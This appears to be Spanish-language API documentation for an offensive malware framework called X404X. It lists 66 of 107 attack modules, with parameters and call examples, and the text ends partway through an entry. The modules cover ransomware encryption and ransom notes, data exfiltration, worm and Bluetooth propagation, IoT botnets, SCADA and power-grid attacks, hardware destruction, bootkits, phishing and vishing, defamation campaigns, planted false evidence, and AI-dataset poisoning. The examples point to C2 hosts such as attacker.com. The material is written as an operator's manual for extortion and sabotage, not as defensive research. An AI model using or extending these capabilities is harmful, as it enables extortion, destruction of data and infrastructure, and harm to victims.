# Catalogo Completo de Modulos X404X (107 Bridge Handlers)

Documentacion tecnica de los 107 modulos implementados como handlers Python en el bridge IPC. Cada modulo se invoca desde el dispatcher Go via el protocolo bridge y devuelve un dict JSON con resultados.

**Ruta base:** `modules/bridge/handlers/`

**Invocacion desde Python:**
```python
from modules.bridge.handlers.<handler_file> import register_routes

registry = {}
register_routes(registry)
result = registry["<category>"]["<module>"](params)
```

---

## ransomware (9 modulos)

Archivo: `handlers/ransomware.py`

---

### 1. ransomware.execute

Ejecuta la cadena completa de ransomware: escaneo, exfiltracion, cifrado y generacion de nota.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `campaign_id` | str | `"demo"` | ID de la campana |
| `company` | str | `"TestCorp"` | Nombre de la empresa victima |
| `simulation` | bool | `True` | Modo simulacion (no destruye archivos reales) |
| `root` | str | `/` o `C:\` | Directorio raiz para escaneo |
| `max_files` | int | `1000` | Limite de archivos a escanear |

**Ejemplo:**
```python
result = registry["ransomware"]["execute"]({
    "campaign_id": "camp_001",
    "company": "AcmeCorp",
    "simulation": True,
    "max_files": 500
})
```

---

### 2. ransomware.scan

Escanea el sistema de archivos buscando datos sensibles mediante patrones regex (DNI, SSN, tarjetas, claves API, etc.).

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `root` | str | `/` o `C:\` | Directorio raiz |
| `max_files` | int | `1000` | Maximo de archivos a analizar |

**Ejemplo:**
```python
result = registry["ransomware"]["scan"]({
    "root": "/home/user",
    "max_files": 2000
})
```

---

### 3. ransomware.encrypt

Cifra archivos objetivo usando AES-256-GCM. En modo simulacion solo cuenta archivos sin modificarlos.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `root` | str | `/` o `C:\` | Directorio raiz |
| `simulation` | bool | `True` | Si `False`, cifra archivos reales |
| `files` | list | `[]` | Lista de archivos especificos a cifrar |

**Ejemplo:**
```python
result = registry["ransomware"]["encrypt"]({
    "root": "/tmp/lab",
    "simulation": True,
    "files": ["/tmp/lab/secret.pdf", "/tmp/lab/data.xlsx"]
})
```

---

### 4. ransomware.exfil

Empaqueta datos sensibles para exfiltracion. Genera paquete cifrado con password aleatoria.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `files` | list | `[]` | Lista de archivos a exfiltrar |
| `password` | str | random hex | Password del paquete |

**Ejemplo:**
```python
result = registry["ransomware"]["exfil"]({
    "files": ["/tmp/secrets/db.sql", "/tmp/secrets/keys.pem"],
    "password": "custom_pass_123"
})
```

---

### 5. ransomware.status

Retorna el estado actual del motor de ransomware: version, patrones cargados, extensiones soportadas.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `simulation` | bool | `True` | Modo actual |

**Ejemplo:**
```python
result = registry["ransomware"]["status"]({"simulation": True})
```

---

### 6. ransomware.decrypt

Descifra archivos previamente cifrados por X404X (operacion de recuperacion).

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `root` | str | `/` o `C:\` | Directorio raiz para buscar `.x404x` |
| `key` | str | `""` | Clave de descifrado en hexadecimal |

**Ejemplo:**
```python
result = registry["ransomware"]["decrypt"]({
    "root": "/tmp/encrypted",
    "key": "a1b2c3d4e5f6..."
})
```

---

### 7. ransomware.generate_note

Genera la nota de rescate personalizada con datos de la empresa, deadline y monto.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `company` | str | `"Unknown Corp"` | Nombre de la victima |
| `deadline` | int | `48` | Horas limite |
| `amount` | int | `50000` | Monto del rescate |
| `currency` | str | `"XMR"` | Criptomoneda (XMR, BTC) |

**Ejemplo:**
```python
result = registry["ransomware"]["generate_note"]({
    "company": "MegaCorp",
    "deadline": 72,
    "amount": 100000,
    "currency": "BTC"
})
```

---

### 8. ransomware.propagate

Propagacion real por red: escanea subred, identifica hosts vivos, mapea puertos vulnerables y exploits disponibles.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `subnet` | str | `"10.0.0.0/24"` | Subred CIDR a escanear |

**Ejemplo:**
```python
result = registry["ransomware"]["propagate"]({
    "subnet": "192.168.1.0/24"
})
```

---

### 9. ransomware.destruct

Operaciones de destruccion real: eliminacion de shadow copies, desactivacion de recuperacion, corrupcion MFT, sabotaje UEFI, destruccion de backups cloud.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `mft` | bool | `False` | Intentar corrupcion de MFT |
| `firmware` | bool | `False` | Sabotaje de variables EFI |
| `cloud_backup` | bool | `False` | Destruir backups cloud |

**Ejemplo:**
```python
result = registry["ransomware"]["destruct"]({
    "mft": True,
    "firmware": True,
    "cloud_backup": True
})
```

---

## ransomware_advanced (17 modulos)

Archivo: `handlers/ransomware_advanced.py`

---

### 10. ransomware_advanced.hope_trap

Trampa psicologica: descifra parcialmente archivos para dar falsa esperanza y despliega falsos descifradores.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `root` | str | `C:\` o `/tmp` | Directorio donde buscar `.x404x` |
| `forensic_watch` | bool | `False` | Activar monitorizacion forense |
| `deploy_fake` | bool | `False` | Desplegar falsos descifradores |

**Ejemplo:**
```python
result = registry["ransomware_advanced"]["hope_trap"]({
    "root": "/tmp/encrypted",
    "deploy_fake": True,
    "forensic_watch": True
})
```

---

### 11. ransomware_advanced.identity_destroy

Destruccion de identidad digital: robo de cookies, sesiones de navegador, secuestro de cuentas sociales y publicacion humillante.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `attacker_phone` | str | `"+666000000"` | Telefono del atacante para 2FA hijack |

**Ejemplo:**
```python
result = registry["ransomware_advanced"]["identity_destroy"]({
    "attacker_phone": "+34600000000"
})
```

---

### 12. ransomware_advanced.raas_panel

Panel RaaS (Ransomware-as-a-Service) multi-tenant. Simula afiliacion a grupos conocidos con notas de rescate personalizadas.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `panel_port` | int | `18080` | Puerto del panel web |
| `auto_join` | bool | `False` | Auto-unirse a grupos RaaS simulados |

**Ejemplo:**
```python
result = registry["ransomware_advanced"]["raas_panel"]({
    "panel_port": 9090,
    "auto_join": True
})
```

---

### 13. ransomware_advanced.fake_decryptor

Genera ejecutables falsos de descifrado que destruyen claves remanentes si son ejecutados por la victima.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `output_dir` | str | temp dir | Directorio de salida |
| `post_to_forums` | bool | `False` | Publicar en foros darknet |

**Ejemplo:**
```python
result = registry["ransomware_advanced"]["fake_decryptor"]({
    "output_dir": "/tmp/output",
    "post_to_forums": True
})
```

---

### 14. ransomware_advanced.worm_deploy

Despliega gusano multiplataforma: escanea subred, identifica SO, explota vulnerabilidades y despliega payload por host.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `subnet` | str | `"192.168.1.0/24"` | CIDR a escanear |
| `platform` | str | `"all"` | Filtro: `all`, `windows`, `linux`, `iot` |
| `ddos_target` | str | `""` | IP para DDoS desde botnet |

**Ejemplo:**
```python
result = registry["ransomware_advanced"]["worm_deploy"]({
    "subnet": "10.0.0.0/24",
    "platform": "windows",
    "ddos_target": "victim.com"
})
```

---

### 15. ransomware_advanced.supply_chain

Ataque de cadena de suministro: envenenamiento de updaters, repositorios git y despliegue de parches falsos.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `artifactory_url` | str | `""` | URL de Artifactory para envenenar |

**Ejemplo:**
```python
result = registry["ransomware_advanced"]["supply_chain"]({
    "artifactory_url": "https://artifactory.internal/repo"
})
```

---

### 16. ransomware_advanced.cloud_exploit

Explotacion de credenciales cloud: busca AWS/Azure/GCP credentials, lanza instancias y despliega parches falsos en S3/Blob.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Autodetecta credenciales locales |

**Ejemplo:**
```python
result = registry["ransomware_advanced"]["cloud_exploit"]({})
```

---

### 17. ransomware_advanced.bluetooth_prop

Propagacion via Bluetooth: descubre dispositivos, explota BlueBorne/BLE MITM, despliega APK malicioso y crea hotspot WiFi falso.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `wifi_direct` | bool | `False` | Activar escaneo WiFi Direct/KRACK |

**Ejemplo:**
```python
result = registry["ransomware_advanced"]["bluetooth_prop"]({
    "wifi_direct": True
})
```

---

### 18. ransomware_advanced.iot_botnet

Crea botnet IoT: escanea camaras IP, routers, DVRs y smart plugs, los infecta y los registra en C2.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `subnet` | str | `"192.168.1.0/24"` | Subred a escanear |

**Ejemplo:**
```python
result = registry["ransomware_advanced"]["iot_botnet"]({
    "subnet": "192.168.0.0/24"
})
```

---

### 19. ransomware_advanced.scada_attack

Ataque a infraestructura SCADA/ICS: descubre PLCs via Modbus/S7/CIP/OPC-UA y ejecuta acciones destructivas.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Autoescaneo de puertos industriales |

**Ejemplo:**
```python
result = registry["ransomware_advanced"]["scada_attack"]({})
```

---

### 20. ransomware_advanced.hardware_kill

Destruccion fisica de hardware: sobrevoltaje CPU/DRAM, desactivacion de ventiladores, quemado de CPU, corrupcion de BIOS.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `overvoltage` | bool | `True` | Aplicar sobrevoltaje |
| `zero_fan` | bool | `True` | Desactivar ventiladores |
| `cpu_burn` | bool | `True` | Quemar CPU con carga infinita |
| `bios_corrupt` | bool | `False` | Intentar corrupcion de BIOS |

**Ejemplo:**
```python
result = registry["ransomware_advanced"]["hardware_kill"]({
    "overvoltage": True,
    "zero_fan": True,
    "cpu_burn": True,
    "bios_corrupt": True
})
```

---

### 21. ransomware_advanced.network_poison

Envenenamiento de red: ARP spoofing masivo, generacion de CA raiz falsa, proxy MITM e inyeccion web.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `gateway` | str | `"192.168.1.1"` | IP del gateway |
| `captive_portal` | bool | `False` | Activar portal cautivo |
| `ssl_strip` | bool | `False` | Activar SSL stripping |

**Ejemplo:**
```python
result = registry["ransomware_advanced"]["network_poison"]({
    "gateway": "10.0.0.1",
    "captive_portal": True,
    "ssl_strip": True
})
```

---

### 22. ransomware_advanced.captive_portal

Despliega portal cautivo falso que engana a victimas para instalar certificado CA raiz malicioso.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `domain` | str | `"update.corporate-network.local"` | Dominio del portal |

**Ejemplo:**
```python
result = registry["ransomware_advanced"]["captive_portal"]({
    "domain": "security-update.internal.corp"
})
```

---

### 23. ransomware_advanced.dna_mutate

Automutacion polimorfica: hibrida el payload con DLLs legitimas del sistema, genera gadgets ROP y muta codigo junk.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `mutation_rate` | int | `15` | Porcentaje de mutacion por generacion |

**Ejemplo:**
```python
result = registry["ransomware_advanced"]["dna_mutate"]({
    "mutation_rate": 25
})
```

---

### 24. ransomware_advanced.bootkit

Instala bootkit persistente: genera MBR malicioso, payload stage2, filtro de disco y fake SMART errors.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Autodetecta metodo de boot |

**Ejemplo:**
```python
result = registry["ransomware_advanced"]["bootkit"]({})
```

---

### 25. ransomware_advanced.blockchain_c2

Canal C2 via blockchain Bitcoin: monitoriza transacciones OP_RETURN para recibir comandos inmutables.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `btc_address` | str | placeholder | Direccion Bitcoin a monitorizar |
| `monitoring` | bool | `True` | Activar monitoreo |

**Ejemplo:**
```python
result = registry["ransomware_advanced"]["blockchain_c2"]({
    "btc_address": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
    "monitoring": True
})
```

---

### 26. ransomware_advanced.survivor_game

Juego psicologico "Superviviente": elimina estaciones de trabajo una a una, duplica rescate para eliminados.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `station_count` | int | `10` | Numero de estaciones participantes |
| `tick_seconds` | int | `90` | Intervalo entre eliminaciones |
| `max_ticks` | int | `station_count` | Maximo de rondas |

**Ejemplo:**
```python
result = registry["ransomware_advanced"]["survivor_game"]({
    "station_count": 20,
    "tick_seconds": 60
})
```

---

## ransomware_v26 (8 modulos)

Archivo: `handlers/ransomware_v26.py`

---

### 27. ransomware_v26.pomdp_decide

Solver POMDP real para seleccion de acciones bajo observabilidad parcial. Analiza EDR activos, conectividad y construye distribucion de creencia.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `god_mode` | bool | `False` | Inyectar caos adicional |

**Ejemplo:**
```python
result = registry["ransomware_v26"]["pomdp_decide"]({
    "god_mode": True
})
```

---

### 28. ransomware_v26.ai_negotiate

Negociacion de rescate potenciada por IA (Ollama). Genera mensajes de presion adaptativos segun turno de conversacion.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `company` | str | `"TargetCorp"` | Empresa victima |
| `amount` | int | random 1M-10M | Monto en USD |
| `turns` | int | `0` | Turno actual de conversacion |
| `victim_response` | str | `""` | Ultima respuesta de la victima |
| `strategy` | str | `"initial_contact"` | Estrategia actual |

**Ejemplo:**
```python
result = registry["ransomware_v26"]["ai_negotiate"]({
    "company": "BankCorp",
    "amount": 5000000,
    "turns": 3,
    "victim_response": "We need more time",
    "strategy": "deadline_pressure"
})
```

---

### 29. ransomware_v26.evasion_deep

Analisis profundo de evasion: verifica hooks en NTDLL, AMSI, ETW, genera syscall stubs indirectos, detecta debuggers y VMs.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Analisis automatico del entorno |

**Ejemplo:**
```python
result = registry["ransomware_v26"]["evasion_deep"]({})
```

---

### 30. ransomware_v26.bootkit_smm

Analisis y generacion de payload SMM/bootkit: acceso EFI, flash SPI, SMRAM, tablas ACPI y generacion de payload MBR/UEFI.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Analisis automatico de firmware |

**Ejemplo:**
```python
result = registry["ransomware_v26"]["bootkit_smm"]({})
```

---

### 31. ransomware_v26.mobile_x

Pipeline de despliegue movil: genera APK con permisos criticos, firma keystore, genera perfil MDM para iOS y accede al keychain.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Detecta SDK de Android/Xcode |

**Ejemplo:**
```python
result = registry["ransomware_v26"]["mobile_x"]({})
```

---

### 32. ransomware_v26.cloud_nemesis

Explotacion cloud avanzada: IMDSv1/v2, generacion de Lambda maliciosa, robo de credenciales AWS/Azure/GCP y C2 serverless.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `c2_endpoint` | str | `"x404x-c2.online"` | Endpoint C2 para Lambda |
| `c2_port` | int | `8443` | Puerto C2 |

**Ejemplo:**
```python
result = registry["ransomware_v26"]["cloud_nemesis"]({
    "c2_endpoint": "attacker.com",
    "c2_port": 443
})
```

---

### 33. ransomware_v26.social_c2

Canal C2 via redes sociales: DNS-over-HTTPS tunnel, dead drops en Twitter/Reddit/GitHub, beacon cifrado.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `doh_provider` | str | `"cloudflare-dns.com"` | Proveedor DoH |
| `twitter_endpoint` | str | `"x404x_status"` | Handle de Twitter |
| `reddit_sub` | str | random | Subreddit para dead drop |
| `c2_domain` | str | `"x404x-c2.online"` | Dominio C2 |
| `beacon_interval` | int | `60` | Segundos entre beacons |

**Ejemplo:**
```python
result = registry["ransomware_v26"]["social_c2"]({
    "doh_provider": "dns.google",
    "c2_domain": "c2.attacker.com",
    "beacon_interval": 120
})
```

---

### 34. ransomware_v26.block_omega

Bloque Omega: destruccion de backups, corrupcion de integridad del sistema, whitelist de AV, persistencia multigeneracional, ataque HVAC/BACnet y implante AMT.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Ejecuta todas las fases automaticamente |

**Ejemplo:**
```python
result = registry["ransomware_v26"]["block_omega"]({})
```

---

## ransomware_v27 (10 modulos)

Archivo: `handlers/ransomware_v27.py`

---

### 35. ransomware_v27.uefi_bootkit

Bootkit UEFI real: genera driver DXE, accede a particion ESP, escribe variables NVRAM y verifica flashrom.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Analisis automatico de EFI |

**Ejemplo:**
```python
result = registry["ransomware_v27"]["uefi_bootkit"]({})
```

---

### 36. ransomware_v27.hypervisor_ring1

Analisis de hypervisor ring -1 (Blue Pill): enumera VMX/SVM, EPT/NPT, detecta hypervisores existentes y evalua capacidad de nesting.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Lee /proc/cpuinfo y modulos kernel |

**Ejemplo:**
```python
result = registry["ransomware_v27"]["hypervisor_ring1"]({})
```

---

### 37. ransomware_v27.pcie_rootkit

Rootkit PCIe: enumera dispositivos PCI, verifica capacidad DMA, evalua IOMMU/VT-d e infecta GPUs y NICs.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Enumera /sys/bus/pci/devices |

**Ejemplo:**
```python
result = registry["ransomware_v27"]["pcie_rootkit"]({})
```

---

### 38. ransomware_v27.kernel_instrument

Instrumentacion de kernel: hooks eBPF, kprobes, silenciamiento ETW, BYOVD (Bring Your Own Vulnerable Driver) y hooks de tabla syscall.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Analisis automatico |

**Ejemplo:**
```python
result = registry["ransomware_v27"]["kernel_instrument"]({})
```

---

### 39. ransomware_v27.secure_boot_bypass

Bypass de Secure Boot: analiza shim, MOK (Machine Owner Key), configuracion GRUB y posibilidad de escritura.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Verifica estado de Secure Boot |

**Ejemplo:**
```python
result = registry["ransomware_v27"]["secure_boot_bypass"]({})
```

---

### 40. ransomware_v27.phishing_infra

Infraestructura de phishing completa: DGA, configuracion Caddy, Cloudflare Workers, proxies SOCKS5 y certificados Let's Encrypt.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `dga_seed` | int | `time.time()` | Semilla para DGA |
| `upstream_proxy` | str | `""` | Proxy upstream |

**Ejemplo:**
```python
result = registry["ransomware_v27"]["phishing_infra"]({
    "dga_seed": 1234567890,
    "upstream_proxy": "socks5://proxy:1080"
})
```

---

### 41. ransomware_v27.spear_phish_ai

Spear phishing con IA: genera perfil OSINT del objetivo, crea lures personalizados via Ollama y landing pages con formularios de credenciales.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `target` | dict/str | `{"name": "Unknown", ...}` | Perfil del objetivo |

**Ejemplo:**
```python
result = registry["ransomware_v27"]["spear_phish_ai"]({
    "target": {
        "name": "John Smith",
        "role": "CFO",
        "company": "TargetCorp"
    }
})
```

---

### 42. ransomware_v27.anti_phish_evasion

Evasion anti-phishing: tokens por victima, bypass de Safe Links, attachments HTML, bypass SPF/DKIM/DMARC.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Genera tokens y tecnicas automaticamente |

**Ejemplo:**
```python
result = registry["ransomware_v27"]["anti_phish_evasion"]({})
```

---

### 43. ransomware_v27.smishing_sms

Gateway de SMS smishing: genera mensajes personalizados, verifica Twilio API y evalua acceso SS7.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `company` | str | `"TargetCorp"` | Empresa para personalizar SMS |
| `target_phone` | str | `"N/A"` | Telefono objetivo |
| `twilio_sid` | str | env var | Twilio Account SID |
| `twilio_token` | str | env var | Twilio Auth Token |

**Ejemplo:**
```python
result = registry["ransomware_v27"]["smishing_sms"]({
    "company": "BankCorp",
    "target_phone": "+34600123456"
})
```

---

### 44. ransomware_v27.vishing_voice

Vishing con TTS: genera scripts de llamada, despliega TwiML, verifica modelos de voz (espeak/festival/Coqui) y spoofea caller ID.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `company` | str | `"TargetCorp"` | Empresa para scripts |

**Ejemplo:**
```python
result = registry["ransomware_v27"]["vishing_voice"]({
    "company": "InsuranceCo"
})
```

---

## ransomware_v28 (23 modulos)

Archivo: `handlers/ransomware_v28.py`

---

### 45. ransomware_v28.iot_identity_theft

Robo de identidad IoT: escanea dispositivos via /sys/class, extrae certificados SSL/TLS y prepara subasta darknet.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Escaneo automatico |

**Ejemplo:**
```python
result = registry["ransomware_v28"]["iot_identity_theft"]({})
```

---

### 46. ransomware_v28.false_memory

Inyeccion de falsos recuerdos: forja conversaciones en DBs de Teams/Slack/Outlook insertando mensajes fabricados.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Busca automaticamente plataformas de chat |

**Ejemplo:**
```python
result = registry["ransomware_v28"]["false_memory"]({})
```

---

### 47. ransomware_v28.thousand_cuts

Corrupcion por mil cortes: bit-flipping silencioso en archivos de base de datos para degradacion progresiva.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Busca archivos .db/.sqlite/.mdf automaticamente |

**Ejemplo:**
```python
result = registry["ransomware_v28"]["thousand_cuts"]({})
```

---

### 48. ransomware_v28.patchguard_bypass

Analisis de bypass de PatchGuard (KPP): verifica DKOM, InfinityHook, modulos del kernel y proteccion de crash dumps.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Analisis del sistema actual |

**Ejemplo:**
```python
result = registry["ransomware_v28"]["patchguard_bypass"]({})
```

---

### 49. ransomware_v28.keyboard_led

Exfiltracion via LEDs del teclado: transmite datos en codigo Morse usando Caps/Scroll/Num Lock.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Verifica acceso a LEDs |

**Ejemplo:**
```python
result = registry["ransomware_v28"]["keyboard_led"]({})
```

---

### 50. ransomware_v28.zombie_army

Ejercito zombie social: automatizacion de navegador para spam/difamacion masiva en redes sociales.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `target` | dict/str | `{"name": "Target", "company": "TargetCorp"}` | Objetivo de difamacion |

**Ejemplo:**
```python
result = registry["ransomware_v28"]["zombie_army"]({
    "target": {"name": "CEO Name", "company": "VictimCorp"}
})
```

---

### 51. ransomware_v28.legacy_poison

Envenenamiento de legado: planta falsa evidencia criminal en historiales bash, repositorios y logs del sistema.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Inyecta en archivos accesibles |

**Ejemplo:**
```python
result = registry["ransomware_v28"]["legacy_poison"]({})
```

---

### 52. ransomware_v28.seo_sabotage

Sabotaje SEO: genera sitios falsos con keywords de escandalo, filtra datos falsos y posiciona contenido negativo.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `company` | str | `"TargetCorp"` | Empresa objetivo del sabotaje |

**Ejemplo:**
```python
result = registry["ransomware_v28"]["seo_sabotage"]({
    "company": "MegaCorp Inc"
})
```

---

### 53. ransomware_v28.fake_vulns

Planta vulnerabilidades falsas en repositorios de codigo: backdoors auth_bypass, SQL injection y mas.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Busca repos git automaticamente |

**Ejemplo:**
```python
result = registry["ransomware_v28"]["fake_vulns"]({})
```

---

### 54. ransomware_v28.inception_hv

Hypervisor inception: analisis de virtualizacion anidada, deteccion de hypervisores existentes y evaluacion de Blue Pill.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Lee CPUID y modulos del kernel |

**Ejemplo:**
```python
result = registry["ransomware_v28"]["inception_hv"]({})
```

---

### 55. ransomware_v28.isp_bgp

Simulacion de hijack BGP: verifica daemons BGP, analiza tabla de rutas y genera prefijos para anuncio malicioso.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `company` | str | `"TargetCorp"` | Empresa cuyo trafico se redirige |

**Ejemplo:**
```python
result = registry["ransomware_v28"]["isp_bgp"]({
    "company": "ISPCorp"
})
```

---

### 56. ransomware_v28.anti_attribution

Anti-atribucion forense: limpia historiales, inyecta ruido en logs, cambia MAC, spoof hostname y planta trampas forenses.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Ejecuta todas las tecnicas |

**Ejemplo:**
```python
result = registry["ransomware_v28"]["anti_attribution"]({})
```

---

### 57. ransomware_v28.power_grid_harmonics

Inyeccion de armonicos en red electrica: detecta interfaces IEC 61850/Modbus/DNP3 y calcula frecuencias de resonancia.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Escanea puertos industriales |

**Ejemplo:**
```python
result = registry["ransomware_v28"]["power_grid_harmonics"]({})
```

---

### 58. ransomware_v28.time_lock

Presion temporal: cuenta regresiva con destruccion progresiva de archivos por lotes segun deadline.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| `time_window` | int | `30` | Ventana de tiempo en minutos |

**Ejemplo:**
```python
result = registry["ransomware_v28"]["time_lock"]({
    "time_window": 60
})
```

---

### 59. ransomware_v28.vr_spyware

Spyware de realidad virtual: detecta headsets (Meta/SteamVR/Vive), accede a camaras y genera mensajes subliminales.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Busca dispositivos VR instalados |

**Ejemplo:**
```python
result = registry["ransomware_v28"]["vr_spyware"]({})
```

---

### 60. ransomware_v28.global_ai_poison

Envenenamiento de datasets de IA: busca archivos ML (CSV, Parquet, TFRecord, Arrow) y los corrompe silenciosamente.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Busca en HuggingFace/Kaggle/caches |

**Ejemplo:**
```python
result = registry["ransomware_v28"]["global_ai_poison"]({})
```

---

### 61. ransomware_v28.cdn_injection

Inyeccion en CDN: secuestra configuraciones de Nginx/Apache/Caddy/Varnish y envenenamiento de cache.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Escanea /etc/nginx, /etc/apache2, etc. |

**Ejemplo:**
```python
result = registry["ransomware_v28"]["cdn_injection"]({})
```

---

### 62. ransomware_v28.bio_cyber_dna

Ataque bio-cyber: busca archivos de secuencias genomicas (FASTA, SAM, VCF) y altera bases de ADN.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Busca en /opt, /home, /var/lib |

**Ejemplo:**
```python
result = registry["ransomware_v28"]["bio_cyber_dna"]({})
```

---

### 63. ransomware_v28.browser_parasite

Parasito de navegador: instala extensiones maliciosas en Chrome/Firefox/Edge y exfiltra credenciales almacenadas.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Detecta navegadores automaticamente |

**Ejemplo:**
```python
result = registry["ransomware_v28"]["browser_parasite"]({})
```

---

### 64. ransomware_v28.fake_documents

Falsificacion de documentos: busca plantillas (DOC, PDF, XLS), extrae watermarks y genera documentos forjados.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Busca en ~/Documents, ~/Desktop |

**Ejemplo:**
```python
result = registry["ransomware_v28"]["fake_documents"]({})
```

---

### 65. ransomware_v28.sound_panic

Panico sonico: accede a dispositivos de audio ALSA/PulseAudio y genera tonos de alarma a maximo volumen.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Detecta interfaces de audio |

**Ejemplo:**
```python
result = registry["ransomware_v28"]["sound_panic"]({})
```

---

### 66. ransomware_v28.emotional_encrypt

Cifrado emocional: prioriza archivos con valor sentimental (fotos familiares, bodas, bebes) para maximizar presion psicologica.

**Parametros:**
| Parametro | Tipo | Default | Descripcion |
|-----------|------|---------|-------------|
| (sin parametros requeridos) | | | Busca en ~/Pictures, ~/Photos, etc. |

**Ejemplo:**
```python
